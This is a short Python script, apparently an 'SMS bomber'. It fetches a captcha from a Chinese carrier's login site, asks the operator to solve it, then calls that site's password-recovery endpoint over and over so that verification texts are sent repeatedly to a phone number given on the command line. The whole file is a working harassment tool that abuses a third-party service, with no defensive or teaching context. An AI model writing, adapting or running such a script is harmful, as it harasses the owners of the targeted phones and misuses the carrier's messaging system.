#!/usr/bin/python

import http.cookiejar
import urllib
import urllib.request
import re
import sys
import time
import os
	
def boomFrom10044Entry(phone, times):
    times = int(times)
    if times <= 0:
        print("times <= 0!")
        return

    verifyCodeUrl = "https://yht.10044.cn/sso/VerifyCode/verifyCodeImage?time=" + str((int)(time.time()))
    print(verifyCodeUrl)

    cookieJar = http.cookiejar.CookieJar()
    handler = urllib.request.HTTPCookieProcessor(cookieJar)
    opener = urllib.request.build_opener(handler)

    vcd = opener.open(verifyCodeUrl).read()

    filePath = sys.path[0] + "/verify.jpg"
    print("file:" + filePath);
    f = open(filePath, 'wb')
    f.write(vcd)
    f.close()
    del f

    if os.name == 'nt':
        os.system('start ' + filePath)
    else:
        os.system('display ' + filePath)
    
    vc = input('Please input the verify code (' + filePath + '):')
    boom = 'https://yht.10044.cn/sso/VerifyCode/findPwdSendPhoneVerifiedCode?phones=' + phone + '&code_message=' + vc + '&appId='

    while times >= 0:
        data = opener.open(boom).read().decode('utf8')
        print('data=' + data)
        print('times=' + str(times))
        time.sleep(60)
        times -= 1

if __name__ == '__main__':
    print('phone=' + sys.argv[1] + ', times=' + sys.argv[2])
    boomFrom10044Entry(sys.argv[1], sys.argv[2])

